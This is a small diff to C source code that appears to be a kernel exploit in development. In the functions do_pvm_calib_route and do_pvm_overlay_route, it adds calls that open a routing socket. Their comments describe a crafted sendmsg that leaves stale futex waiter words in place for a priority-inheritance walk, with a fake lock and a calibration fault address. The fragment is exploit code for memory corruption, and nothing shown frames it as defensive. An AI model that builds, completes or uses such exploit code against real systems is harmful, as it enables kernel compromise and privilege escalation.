@@ -253,6 +253,7 @@ static void overlay_fill_words(char *buf, size_t bytes, int base_word) {
  * with a fault address (buffer<<56 | word<<12) identifying the exact
  * stale-waiter position.  Read it back from pstore after reboot. */
 void do_pvm_calib_route(void) {
+  gl_open_route_socket();
   struct iovec lv[8], rv[8], siov[8];
   char ctlbuf[32];
   struct msghdr msg;
@@ -298,6 +299,7 @@ void do_pvm_calib_route(void) {
 /* PVM_ROUTE=1: real overlay.  One crafted sendmsg leaves the stale-waiter
  * words in place for the consumer PI walk. */
 void do_pvm_overlay_route(void) {
+  gl_open_route_socket();
   if (!page_base || !fake_lock) {
     pr_error("pvm overlay missing page=%016zx lock=%016zx\n", page_base,
              fake_lock);
